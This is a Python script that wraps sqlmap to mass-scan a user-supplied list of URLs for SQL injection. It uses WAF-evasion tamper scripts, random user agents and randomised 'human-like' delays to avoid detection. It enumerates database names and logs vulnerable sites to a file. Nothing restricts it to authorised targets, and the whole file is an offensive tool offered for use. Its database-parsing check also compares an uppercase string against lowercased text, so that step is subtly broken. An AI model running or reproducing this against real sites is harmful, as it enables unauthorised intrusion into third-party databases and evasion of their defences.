#!/usr/bin/env python3

import os
import subprocess
import time
import random
import re

SQLMAP_PATH = "sqlmap"  # adjust path if needed
OUTPUT_FILE = "sqli.txt"
TAMPER_SCRIPTS = "between,randomcase,charunicodeencode,space2comment"

MIN_DELAY = 1.0
MAX_DELAY = 2.0

def extract_databases(output_text):
    dbs = []
    found = False
    for line in output_text.splitlines():
        if '[INFO] fetching database names' in line.lower():
            found = True
        elif found and re.match(r"^\[\*\] (.+)$", line.strip()):
            dbs.append(re.sub(r"^\[\*\] ", "", line.strip()))
        elif found and line.strip() == "":
            break
    return dbs

def run_sqlmap(url):
    print(f"\n[+] Testing: {url}")

    cmd = [
        SQLMAP_PATH,
        "-u", url,
        "--batch",
        "--random-agent",
        "--level=3",
        "--risk=2",
        "--tamper", TAMPER_SCRIPTS,
        "--technique=BEUSTQ",
        "--delay=0.3",
        "--timeout=20",
        "--retries=2",
        "--threads=3",
        "--fresh-queries",
        "--smart",
        "--dbs"
    ]

    result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    output = result.stdout

    if "sql injection" in output.lower() or "is vulnerable" in output.lower():
        dbs = extract_databases(output)
        if dbs:
            with open(OUTPUT_FILE, "a") as f:
                f.write(f"{url}\n\ndatabase:\n")
                for db in dbs:
                    f.write(f"{db}\n")
                f.write("\n")
            print(f"[✓] Found SQLi + DBs: {url}")
        else:
            print("[!] SQLi found but no DBs extracted. Skipped saving.")
    else:
        print("[-] Not vulnerable.")

def main():
    url_file = input("[?] Enter path to URL list: ").strip()

    if not os.path.isfile(url_file):
        print(f"[!] File not found: {url_file}")
        return

    with open(url_file, "r") as f:
        urls = [line.strip() for line in f if line.strip()]

    print(f"[i] Starting scan on {len(urls)} URLs...\n")

    for url in urls:
        try:
            run_sqlmap(url)
            time.sleep(random.uniform(MIN_DELAY, MAX_DELAY))  # Human-like delay
        except KeyboardInterrupt:
            print("[!] Interrupted by user.")
            break
        except Exception as e:
            print(f"[!] Error scanning {url}: {e}")

    print(f"\n[✓] Scan finished. Results saved in: {OUTPUT_FILE}")

if __name__ == "__main__":
    main()
